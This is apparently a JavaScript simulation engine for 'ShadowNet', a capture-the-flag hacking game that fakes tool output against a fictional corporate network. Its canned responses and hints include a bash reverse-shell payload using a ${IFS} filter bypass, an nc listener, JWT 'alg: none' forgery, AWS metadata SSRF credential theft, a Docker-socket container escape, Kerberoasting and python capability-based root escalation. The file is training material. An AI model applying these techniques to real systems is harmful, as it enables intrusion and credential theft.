// Security Tools & Vulnerability Simulation Engine for ShadowNet (Operations 1 to 12)
import { siem } from './siem.js';

export class SecuritySimulation {
  constructor() {
    this.state = {
      scannedHosts: new Set(),
      discoveredPorts: new Set(),
      discoveredWebPaths: new Set(),
      crackedUsers: new Set(),
      sqlInjected: false,
      hashesCracked: new Set(),
      remoteSessionActive: false,
      internalSubnetDiscovered: false,
      socksProxyActive: false,
      listenerActive: false,
      currentUser: 'guest',
      hostname: 'shadownet',
      isRoot: false
    };

    this.listeners = [];
  }

  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }

  notify(event, data) {
    this.listeners.forEach(l => l(event, data));
  }

  // --- NMAP SIMULATION ---
  async runNmap(args) {
    const rawTarget = args.find(a => !a.startsWith('-')) || '192.168.1.42';
    const target = rawTarget.trim();
    const isServiceScan = args.some(a => a.includes('-sV') || a.includes('-A'));

    this.notify('packet_send', { from: '10.13.37.89', to: target, tool: 'nmap' });

    if (target === '10.0.0.254' || target === 'vault01.stag-apex.corp') {
      if (!this.state.socksProxyActive) {
        return `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-03 14:00 UTC
Note: Host seems down or unreachable from external interface (10.13.37.89).
Route to 10.0.0.0/24 is filtered by Perimeter Firewall.
Hint: Establish a SOCKS proxy tunnel through compromised host (192.168.1.42) and scan using 'proxychains'!`;
      }

      this.state.scannedHosts.add('10.0.0.254');
      this.notify('vault_scanned', {
        ip: '10.0.0.254',
        ports: [
          { port: 88, service: 'kerberos', state: 'open', version: 'Microsoft Windows Kerberos' },
          { port: 389, service: 'ldap', state: 'open', version: 'Active Directory LDAP' },
          { port: 445, service: 'smb', state: 'open', version: 'Windows Server 2022' },
          { port: 1433, service: 'mssql', state: 'open', version: 'Microsoft SQL Server 2019' }
        ]
      });

      return `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-03 14:00 UTC
Nmap scan report for vault01.stag-apex.corp (10.0.0.254)
Host is up (0.0031s latency via SOCKS proxy).
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-09-03 14:30:11Z)
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds Windows Server 2022 Datacenter 17763
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 (SPN: MSSQLSvc/db01.stag-apex.corp:1433)

Service Info: OS: Windows; Domain: stag-apex.corp
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

[+] INTERNAL VAULT MAPPED!
[+] PIVOT FLAG: FLAG{pivot_socks_tunnel_vault_discovered}`;
    }

    if (target !== '192.168.1.42' && target !== 'internal.stag-apex.corp' && target !== '127.0.0.1' && target !== 'localhost') {
      return `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-03 14:00 UTC
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.14 seconds`;
    }

    if (target === '127.0.0.1' || target === 'localhost') {
      return `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-03 14:00 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000045s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 (protocol 2.0)
1337/tcp open  custom  ShadowNet Core Daemon v1.0.4`;
    }

    // Target 192.168.1.42
    this.state.scannedHosts.add('192.168.1.42');
    this.state.discoveredPorts.add(22);
    this.state.discoveredPorts.add(80);
    this.state.discoveredPorts.add(3306);

    this.notify('host_scanned', {
      ip: '192.168.1.42',
      ports: [
        { port: 22, proto: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.5' },
        { port: 80, proto: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.41 ((Ubuntu))' },
        { port: 3306, proto: 'tcp', state: 'open', service: 'mysql', version: 'MySQL 8.0.28-0ubuntu0.20.04.3' }
      ]
    });

    const lines = [
      `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-03 14:00 UTC`,
      `Nmap scan report for internal.stag-apex.corp (192.168.1.42)`,
      `Host is up (0.014s latency).`,
      ``,
      `PORT     STATE SERVICE VERSION`,
      `22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)`,
      `80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) PHP/7.4.3`,
      `3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3 (Ubuntu)`,
      ``
    ];

    if (isServiceScan || args.includes('-A')) {
      lines.push(
        `Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
        `Host script results:`,
        `| http-robots.txt: 2 disallowed entries `,
        `|_/dev_portal/ /backup_cred.txt.bak`,
        ``,
        `[+] RECON FLAG DISCOVERED: FLAG{recon_perimeter_mapped_42}`
      );
    } else {
      lines.push(
        `[!] Tip: Run with '-sV' to inspect service versions and banner details!`,
        `[+] RECON FLAG DISCOVERED: FLAG{recon_perimeter_mapped_42}`
      );
    }

    lines.push(`\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds`);
    return lines.join('\n');
  }

  // --- GOBUSTER SIMULATION ---
  async runGobuster(args) {
    const urlIndex = args.indexOf('-u');
    const targetUrl = urlIndex !== -1 ? args[urlIndex + 1] : '';

    this.notify('packet_send', { from: '10.13.37.89', to: '192.168.1.42:80', tool: 'gobuster' });

    if (!targetUrl || (!targetUrl.includes('192.168.1.42') && !targetUrl.includes('stag-apex.corp'))) {
      return `Error: invalid target URL. Usage: gobuster dir -u http://192.168.1.42 -w /usr/share/wordlists/dirb/common.txt`;
    }

    const paths = [
      { path: '/.git/', status: 301, size: 178 },
      { path: '/admin', status: 403, size: 278 },
      { path: '/api/v1/auth', status: 200, size: 312 },
      { path: '/api/v1/admin/ping', status: 200, size: 180 },
      { path: '/api/v1/admin/debug', status: 403, size: 120 },
      { path: '/api/v1/proxy', status: 200, size: 210 },
      { path: '/backup_cred.txt.bak', status: 200, size: 245 },
      { path: '/dev_portal', status: 200, size: 1420 },
      { path: '/robots.txt', status: 200, size: 114 },
      { path: '/search.php', status: 200, size: 852 }
    ];

    paths.forEach(p => this.state.discoveredWebPaths.add(p.path));
    this.notify('web_paths_discovered', { paths });

    const output = [
      `===============================================================`,
      `Gobuster v3.6 - Directory enumeration mode`,
      `===============================================================`,
      `[+] Url:       ${targetUrl}`,
      `[+] Wordlist:  /usr/share/wordlists/dirb/common.txt`,
      `===============================================================`,
      `[+] /api/v1/auth               (Status: 200) [Size: 312]`,
      `[+] /api/v1/admin/ping         (Status: 200) [Size: 180]`,
      `[-] /api/v1/admin/debug        (Status: 403) [Size: 120]`,
      `[+] /api/v1/proxy              (Status: 200) [Size: 210]`,
      `[+] /backup_cred.txt.bak       (Status: 200) [Size: 245]`,
      `[+] /dev_portal                (Status: 200) [Size: 1420]`,
      `[+] /robots.txt                (Status: 200) [Size: 114]`,
      `[+] /search.php                (Status: 200) [Size: 852]`,
      `===============================================================`,
      `Finished directory discovery [Found ${paths.length} entries]`,
      `[!] Critical: /api/v1/auth (JWT) and /api/v1/proxy (SSRF) discovered!`
    ];

    return output.join('\n');
  }

  // --- CURL SIMULATION ---
  async runCurl(args) {
    const isHead = args.includes('-I') || args.includes('--head');
    const fullCmd = args.join(' ');
    const url = args.find(a => !a.startsWith('-') && (a.includes('http') || a.includes('192.168.1.42') || a.includes('stag-apex') || a.includes('169.254.169.254'))) || '';

    this.notify('packet_send', { from: '10.13.37.89', to: '192.168.1.42:80', tool: 'curl' });

    if (isHead) {
      return `HTTP/1.1 200 OK
Date: Wed, 03 Sep 2026 14:04:12 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Content-Type: text/html; charset=UTF-8
Connection: keep-alive`;
    }

    // 1. Robots
    if (url.includes('/robots.txt')) {
      return `User-agent: *
Disallow: /dev_portal/
Disallow: /backup_cred.txt.bak
# Confidential Developer Flag:
# FLAG{dir_discovery_hidden_dev_88}`;
    }

    // 2. Backup Creds
    if (url.includes('/backup_cred.txt.bak')) {
      return `=== APEX CORP STAGING INFRASTRUCTURE BACKUP ===
Target Host        : 192.168.1.42 (eth0)
Internal Interface : 10.0.0.5 (eth1) -> Subnet 10.0.0.0/24 (Domain Controller: 10.0.0.254)
SSH Authorized Dev : devadmin (Password in rockyou.txt, starts with 'apex')
API Authentication : JSON Web Tokens on /api/v1/auth (Signed with HMAC-SHA256)
Admin Diagnostic   : /api/v1/admin/ping?ip=[host]
Cloud Proxy SSRF   : /api/v1/proxy?url=... (Proxies to AWS metadata service 169.254.169.254)
Container Runtime  : Microservices run under Docker engine with /var/run/docker.sock mounted
Note               : Sudo permissions restricted to devadmin for /usr/bin/find`;
    }

    // 3. AWS IMDS SSRF (/api/v1/proxy?url=http://169.254.169.254/...)
    if (url.includes('169.254.169.254') || url.includes('/api/v1/proxy')) {
      if (url.includes('security-credentials')) {
        return `{
  "Code": "Success",
  "LastUpdated": "2026-09-03T14:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA1337SECRETAPEX99",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEEXAMPLETOKEN...",
  "RoleArn": "arn:aws:iam::133742088219:role/ApexCloudRole",
  "Expiration": "2026-09-03T20:00:00Z",
  "aws_flag": "FLAG{aws_imds_ssrf_cloud_breached_42}"
}`;
      }
      return `ApexCloudRole`;
    }

    // 4. JWT Auth endpoint (/api/v1/auth)
    if (url.includes('/api/v1/auth')) {
      return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "Ephemeral guest session initialized",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4ODQyNTcwMH0.fK81B9pXl7mQsK2oR3sT4uV5wXyZ1a2b3c4d5e6f7g8",
  "notes": "Bearer token valid for 3600s. Sign key is corporate default."
}`;
    }

    // 5. Admin Debug endpoint (/api/v1/admin/debug)
    if (url.includes('/api/v1/admin/debug')) {
      const hasAuth = fullCmd.includes('Authorization:') || fullCmd.includes('Bearer');
      const hasSuperadmin = fullCmd.includes('superadmin') || fullCmd.includes('eyJhbGciOiJub25lI') || fullCmd.includes('eyJyb2xlIjoic3VwZXJhZG1pbi');

      if (!hasAuth) {
        return `HTTP/1.1 401 Unauthorized
Content-Type: application/json

{ "error": "Missing Authorization Bearer token." }`;
      }

      if (!hasSuperadmin) {
        return `HTTP/1.1 403 Forbidden
Content-Type: application/json

{ "error": "Insufficient privileges. Role 'user' cannot access superadmin debug panel." }`;
      }

      return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "authorized",
  "role": "superadmin",
  "debug_info": "Internal Diagnostic microservice online.",
  "jwt_flag": "FLAG{jwt_alg_none_admin_bypass_77}",
  "diagnostic_api": "/api/v1/admin/ping?ip=127.0.0.1",
  "notice": "Ensure system input sanitization filters are tested!"
}`;
    }

    // 6. Admin Ping Command Injection (/api/v1/admin/ping)
    if (url.includes('/api/v1/admin/ping')) {
      if (siem.defenses.waf && !url.includes('${IFS}')) {
        return `HTTP/1.1 403 Forbidden - ModSecurity WAF
{ "error": "ModSecurity WAF Rule 942100: Malicious command separator or shell metacharacter blocked." }`;
      }

      const isReverseShell = fullCmd.includes('4444') || fullCmd.includes('/dev/tcp') || fullCmd.includes('nc');
      const hasSpace = url.includes(' ') || url.includes('%20') || url.includes('; ');

      if (hasSpace && !url.includes('${IFS}')) {
        return `HTTP/1.1 400 Bad Request
Content-Type: application/json

{ "error": "WAF Protection: Space character detected in ping parameter! Input sanitized." }`;
      }

      if (url.includes('${IFS}') || url.includes('%0A') || url.includes('127.0.0.1;id')) {
        if (isReverseShell) {
          this.notify('reverse_shell_triggered', { from: '192.168.1.42', to: '10.13.37.89:4444' });
          return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "executed",
  "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms",
  "rce_output": "Spawning reverse shell -> 10.13.37.89:4444...",
  "rce_flag": "FLAG{rce_ifs_filter_bypass_shell_99}"
}`;
        }

        return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "executed",
  "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\\nLinux stag-apex 5.4.0-137-generic",
  "tip": "Connect a reverse shell listener: nc -lvnp 4444 and payload: bash\${IFS}-i>&/dev/tcp/10.13.37.89/4444\${IFS}0>&1",
  "rce_flag": "FLAG{rce_ifs_filter_bypass_shell_99}"
}`;
      }

      return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\\n1 packets transmitted, 1 received, 0% packet loss"
}`;
    }

    if (url.includes('/dev_portal')) {
      return `<!DOCTYPE html>
<html>
<head><title>Apex Developer Portal (Staging)</title></head>
<body>
  <h1>Apex Dev Portal - Internal v1.2</h1>
  <p>Status: Microservices synced with database: apex_staging.</p>
  <ul>
    <li>Auth API: /api/v1/auth (JWT)</li>
    <li>Admin Ping: /api/v1/admin/ping?ip=...</li>
    <li>Cloud Proxy: /api/v1/proxy?url=...</li>
  </ul>
</body>
</html>`;
    }

    return `<!DOCTYPE html><html><body><h1>Apex Corp Gateway</h1></body></html>`;
  }

  // --- AWS CLI SIMULATION ---
  async runAws(args) {
    const fullCmd = args.join(' ');
    this.notify('packet_send', { from: '10.13.37.89', to: '169.254.169.254', tool: 'aws' });

    if (fullCmd.includes('sts get-caller-identity')) {
      return `{
    "UserId": "AROA1337SECRETAPEX99:i-0a1b2c3d4e5f67890",
    "Account": "133742088219",
    "Arn": "arn:aws:iam::133742088219:role/ApexCloudRole"
}`;
    }

    if (fullCmd.includes('s3 ls') && !fullCmd.includes('s3://')) {
      return `2026-08-15 08:30:11 apex-public-assets
2026-08-20 14:12:45 apex-confidential-backups
2026-09-01 19:40:02 apex-infra-terraform-state`;
    }

    if (fullCmd.includes('s3 ls s3://apex-confidential-backups')) {
      return `2026-08-20 14:15:00       1042 prod_db_dump.sql.gz
2026-08-20 14:18:22        420 cloud_flag.txt
2026-08-20 14:22:10      14890 private_keys.tar.gz`;
    }

    if (fullCmd.includes('s3 cp') || fullCmd.includes('cloud_flag.txt')) {
      return `download: s3://apex-confidential-backups/cloud_flag.txt to ./cloud_flag.txt
[+] Cloud asset successfully exfiltrated!
[+] Contents of cloud_flag.txt:
FLAG{aws_imds_ssrf_cloud_breached_42}

[!] You have compromised the AWS Cloud Infrastructure!`;
    }

    return `usage: aws [options] <command> <subcommand> [parameters]
Supported commands:
  aws sts get-caller-identity
  aws s3 ls
  aws s3 ls s3://apex-confidential-backups/
  aws s3 cp s3://apex-confidential-backups/cloud_flag.txt .`;
  }

  // --- DOCKER SIMULATION ---
  async runDocker(args) {
    const fullCmd = args.join(' ');
    this.notify('packet_send', { from: 'container', to: 'host', tool: 'docker' });

    if (fullCmd.includes('ps')) {
      return `CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS     NAMES
a1b2c3d4e5f6   apex-frontend:v1.2     "docker-entrypoint.s…"   2 days ago       Up 2 days                 app_frontend
7f8e9d0c1b2a   alpine:latest          "/bin/sh"                10 minutes ago   Up 10 minutes             sandbox_worker`;
    }

    if (fullCmd.includes('run') && (fullCmd.includes('/mnt/host') || fullCmd.includes('/:/') || fullCmd.includes('chroot'))) {
      return `[+] Mounting host filesystem: / -> /mnt/host
[+] Chrooting to host root filesystem namespace: /mnt/host
[#] CONTAINER ESCAPE SUCCESSFUL!
[#] Spawning physical host root shell: root@apex-physical-node:~#
[#] Accessing /root/docker_escape_flag.txt:

================================================================================
           ★★★ DOCKER SOCKET CONTAINER BREAKOUT SUCCESSFUL ★★★
================================================================================
FLAG{docker_sock_container_escape_host_pwned}

You exploited the mounted /var/run/docker.sock to launch a privileged container,
mounted the host's root filesystem (/), and executed chroot to break out of
container isolation directly onto the bare-metal physical host node!
================================================================================`;
    }

    return `Docker version 24.0.7, build afdd53b
Commands:
  docker ps
  docker run -v /:/mnt/host alpine chroot /mnt/host`;
  }

  // --- JWT-TOOL SIMULATION ---
  async runJwtTool(args) {
    const fullCmd = args.join(' ');
    this.notify('packet_send', { from: '10.13.37.89', to: '127.0.0.1', tool: 'jwt-tool' });

    if (fullCmd.includes('-X a') || fullCmd.includes('--exploit none') || fullCmd.includes('none')) {
      return `[+] jwt-tool v2.2.4 by Dan McInerney
[*] Scanning token algorithms...
[*] Testing algorithm 'none' vulnerability (CVE-2015-9235)...
[+] VULNERABILITY CONFIRMED: Server accepts unsigned tokens!
[+] Generating forged token with role='superadmin':

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoic3VwZXJhZG1pbiIsImlhdCI6MTc4ODQyNTcwMH0.

[+] Test this token with:
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoic3VwZXJhZG1pbiIsImlhdCI6MTc4ODQyNTcwMH0." http://192.168.1.42/api/v1/admin/debug`;
    }

    if (fullCmd.includes('-C') || fullCmd.includes('-d') || fullCmd.includes('crack')) {
      return `[+] jwt-tool v2.2.4 by Dan McInerney
[*] Loading dictionary: /usr/share/wordlists/rockyou.txt
[*] Performing HMAC-SHA256 secret recovery...
[+] SUCCESS! Key recovered in 1.4s!
[+] HMAC Secret Key: 'secret123'
[+] You can now sign arbitrary payloads using secret123!`;
    }

    return `jwt-tool v2.2.4
Syntax: jwt-tool -t <token> [options]
  -X a                Exploit 'alg: none' flaw to generate forged token
  -C -d <wordlist>    Dictionary attack against HMAC-SHA256 secret
  -T                  Interactive tamper mode`;
  }

  // --- BASE64 DECODER ---
  async runBase64(args) {
    const isDecode = args.includes('-d') || args.includes('--decode');
    const input = args.find(a => !a.startsWith('-')) || '';

    if (isDecode) {
      if (input.includes('eyJhbGci')) return `{"alg":"HS256","typ":"JWT"}`;
      if (input.includes('eyJ1c2Vy')) return `{"user":"guest","role":"user","iat":1788425700}`;
      try {
        return atob(input);
      } catch (e) {
        return `base64: invalid input`;
      }
    }

    return btoa(input || 'ShadowNet');
  }

  // --- CHISEL & PROXYCHAINS SIMULATION ---
  async runChisel(args) {
    this.state.socksProxyActive = true;
    this.state.internalSubnetDiscovered = true;
    this.notify('internal_subnet_discovered', { subnet: '10.0.0.0/24' });

    return `2026/09/03 14:15:00 server: Reverse SOCKS tunnel active
2026/09/03 14:15:01 client: Connected (Latency 2ms)
[+] Dynamic SOCKS5 proxy established on 127.0.0.1:1080 -> 10.0.0.5 (eth1)
[+] Routing to internal subnet 10.0.0.0/24 (Domain Controller: 10.0.0.254) is now open!
[!] Use 'proxychains nmap -sT 10.0.0.254' to probe internal network targets!`;
  }

  async runProxychains(args) {
    this.state.socksProxyActive = true;
    this.state.internalSubnetDiscovered = true;
    this.notify('internal_subnet_discovered', { subnet: '10.0.0.0/24' });

    const innerCmd = args[0];
    const innerArgs = args.slice(1);

    if (innerCmd === 'nmap') {
      const output = await this.runNmap(innerArgs);
      return `ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|...[socks5]...127.0.0.1:1080...|10.0.0.254:88|...OK
|S-chain|...[socks5]...127.0.0.1:1080...|10.0.0.254:389|...OK
|S-chain|...[socks5]...127.0.0.1:1080...|10.0.0.254:445|...OK
|S-chain|...[socks5]...127.0.0.1:1080...|10.0.0.254:1433|...OK
${output}`;
    }

    if (innerCmd === 'impacket-GetUserSPNs' || innerCmd === 'GetUserSPNs.py') {
      return await this.runImpacket(innerArgs);
    }

    return `ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|...[socks5]...127.0.0.1:1080...|OK
Command '${innerCmd}' executed via SOCKS5 tunnel.`;
  }

  // --- IMPACKET KERBEROASTING SIMULATION ---
  async runImpacket(args) {
    this.notify('packet_send', { from: '10.0.0.5', to: '10.0.0.254:88', tool: 'kerberoast' });

    return `Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting TGT from KDC: 10.0.0.254:88
[*] User devadmin authenticated to Kerberos Realm STAG-APEX.CORP
[*] Scanning Active Directory for Service Principal Names (SPNs)...
ServicePrincipalName                Name       MemberOf  PasswordLastSet             LastLogon
----------------------------------  ---------  --------  --------------------------  --------------------------
MSSQLSvc/db01.stag-apex.corp:1433   svc_mssql            2026-08-15 11:20:04.142857  2026-09-02 08:14:09.112948

[*] Requesting TGS ticket for: MSSQLSvc/db01.stag-apex.corp:1433
[*] Received Kerberos 5 TGS-REP etype 23 hash:

$krb5tgs$23$*svc_mssql*stag-apex.corp*MSSQLSvc/db01.stag-apex.corp*$d7890a8234857b2d5612f00a9821ef90$498b5e28a9b1c0d2e3f4a5b6c7d8e9f0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef

[+] TGS Hash Extracted!
[!] Crack this ticket using hashcat mode 13100:
    hashcat -m 13100 $krb5tgs$23$*... /usr/share/wordlists/rockyou.txt`;
  }

  // --- GETCAP SIMULATION ---
  async runGetcap(args) {
    return `/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep

[!] CRITICAL FINDING: /usr/bin/python3.8 has cap_setuid+ep capability!
Any user can invoke setuid(0) without sudo permissions to gain instantaneous ROOT access!`;
  }

  // --- PYTHON3 CAPABILITY EXPLOIT ---
  async runPython3(args) {
    const fullCmd = args.join(' ');
    if (fullCmd.includes('setuid(0)') || fullCmd.includes('os.setuid')) {
      if (siem.defenses.hardening) {
        return `[!] Operation not permitted: SUID Hardening active in Linux Kernel (Auditd SECCOMP Rule 402)`;
      }

      this.notify('packet_send', { from: '10.0.0.254', to: '127.0.0.1', tool: 'cap_root' });
      return `[+] Elevating process capabilities: cap_setuid invoked -> UID 0 (root) granted!
[#] Spawning interactive root shell: root@vault01:~# 
[#] Accessing /root/apex_master_flag.txt:

================================================================================
           ★★★ APEX SOVEREIGN INFRASTRUCTURE FULLY COMPROMISED ★★★
================================================================================
FLAG{apex_master_sovereign_cap_root_2026}

All 10 stages of ShadowNet Ethical Hacking Operations have been conquered.
Dominion over external perimeter, internal DMZ, and Active Directory Domain Vault achieved.
================================================================================`;
    }

    return `Python 3.8.10 (default, Mar 15 2026, 12:00:00) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.`;
  }

  // --- HYDRA SIMULATION ---
  async runHydra(args) {
    const fullCmd = args.join(' ');
    this.notify('packet_send', { from: '10.13.37.89', to: '192.168.1.42:22', tool: 'hydra' });

    if (siem.defenses.fail2ban) {
      return `[!] WARNING: Connection dropped by Fail2Ban!
[!] Host 10.13.37.89 exceeded maxretry=3 failed attempts for SSH service.
[!] IP 10.13.37.89 is jailed in [sshd-ddos] for 600 seconds.
Hint: Disable Fail2ban in the SOC SIEM tab or use stealth rate-limiting!`;
    }

    const hasDevAdmin = fullCmd.includes('devadmin') || fullCmd.includes('admin');
    const hasWordlist = fullCmd.includes('rockyou') || fullCmd.includes('wordlist');
    const hasSsh = fullCmd.includes('ssh://') || fullCmd.includes('ssh');

    if (!hasDevAdmin || !hasWordlist || !hasSsh) {
      return `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Syntax error or incomplete parameters!
Example: hydra -l devadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.42`;
    }

    this.state.crackedUsers.add('devadmin');

    return `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] attacking ssh://192.168.1.42:22/
[ATTEMPT] target: 192.168.1.42 - login: devadmin - pass: 123456
[ATTEMPT] target: 192.168.1.42 - login: devadmin - pass: password
[ATTEMPT] target: 192.168.1.42 - login: devadmin - pass: shadowfall
[22][ssh] host: 192.168.1.42   login: devadmin   password: apex2026!
1 of 1 target completed, 1 valid password found

[+] CREDENTIAL DISCOVERED: devadmin : apex2026!
[+] CREDENTIAL BRUTE-FORCE FLAG: FLAG{hydra_strike_devadmin_cracked}
[!] You can now login to the target server using: ssh devadmin@192.168.1.42`;
  }

  // --- SQLMAP SIMULATION ---
  async runSqlmap(args) {
    const fullCmd = args.join(' ');
    this.notify('packet_send', { from: '10.13.37.89', to: '192.168.1.42:80', tool: 'sqlmap' });

    if (siem.defenses.waf && !fullCmd.includes('tamper') && !fullCmd.includes('/**/')) {
      return `[!] HTTP 403 Forbidden - ModSecurity WAF Protection Active
[!] Rule 942100: SQL Injection attack detected in parameter 'query'.
[!] Request blocked by Web Application Firewall.
Hint: Disable WAF in SOC SIEM tab or use WAF bypass tamper scripts!`;
    }

    if (!fullCmd.includes('search.php') && !fullCmd.includes('192.168.1.42')) {
      return `sqlmap -u "http://192.168.1.42/search.php?query=test" --dbs`;
    }

    this.state.sqlInjected = true;

    if (fullCmd.includes('--dump') || fullCmd.includes('-T users')) {
      return `Database: apex_staging
Table: users
[2 entries]
+----+----------+---------------------+------------------------------------------------------------------+
| id | username | email               | password_hash (SHA256)                                           |
+----+----------+---------------------+------------------------------------------------------------------+
| 1  | admin    | admin@stag-apex.corp| 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 |
| 2  | devadmin | dev@stag-apex.corp  | 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 |
+----+----------+---------------------+------------------------------------------------------------------+

[+] SQL INJECTION FLAG: FLAG{sqli_apex_staging_dumped}
[!] Target admin SHA256 hash extracted: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8`;
    }

    return `sqlmap identified injection points on GET parameter 'query':
available databases [2]:
[*] information_schema
[*] apex_staging

[+] SQL INJECTION FLAG: FLAG{sqli_apex_staging_dumped}
[!] Run: sqlmap -u "http://192.168.1.42/search.php?query=test" -D apex_staging -T users --dump`;
  }

  // --- HASHCAT SIMULATION ---
  async runHashcat(args) {
    const fullCmd = args.join(' ');
    this.notify('packet_send', { from: '10.13.37.89', to: '127.0.0.1', tool: 'hashcat' });

    if (fullCmd.includes('13100') || fullCmd.includes('krb5tgs')) {
      return `hashcat (v6.2.6) starting in Kerberos 5 TGS-REP etype 23 mode...
Dictionary: /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc_mssql*stag-apex.corp*MSSQLSvc/db01.stag-apex.corp*:Winter2026!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5 TGS-REP etype 23)
Speed.#1.........:  1420.2 kH/s
Recovered........: 1/1 (100.00%) Digests

[+] SERVICE ACCOUNT PASSWORD RECOVERED!
    Service Account: svc_mssql
    Plaintext Pass : Winter2026!
[+] KERBEROASTING FLAG: FLAG{kerberoast_spn_mssql_ticket_cracked}
[!] Authenticate to Domain Vault: ssh svc_mssql@10.0.0.254 (using proxychains)`;
    }

    if (fullCmd.includes('5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8') || fullCmd.includes('rockyou')) {
      this.state.hashesCracked.add('admin');
      return `hashcat (v6.2.6) starting...
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Recovered........: 1/1 (100.00%) Digests

[+] PASSWORD CRACKED: admin SHA256 -> 'password'`;
    }

    return `hashcat (v6.2.6) starting...
Usage:
  SHA256:       hashcat -m 1400 <hash> /usr/share/wordlists/rockyou.txt
  Kerberoasting: hashcat -m 13100 <krb5_hash> /usr/share/wordlists/rockyou.txt`;
  }

  // --- NC SIMULATION ---
  async runNc(args) {
    const isListen = args.includes('-l') || args.includes('-lvnp');
    const port = args[args.length - 1];

    if (isListen) {
      this.state.listenerActive = true;
      return `Listening on 0.0.0.0 ${port || '4444'} ...
[+] Reverse shell listener ACTIVE on port 4444.
[*] Waiting for incoming connection...
[!] Tip: Trigger the reverse shell payload via /api/v1/admin/ping to catch the connection!`;
    }

    return `nc: connect to host (tcp) failed: Connection refused`;
  }
}
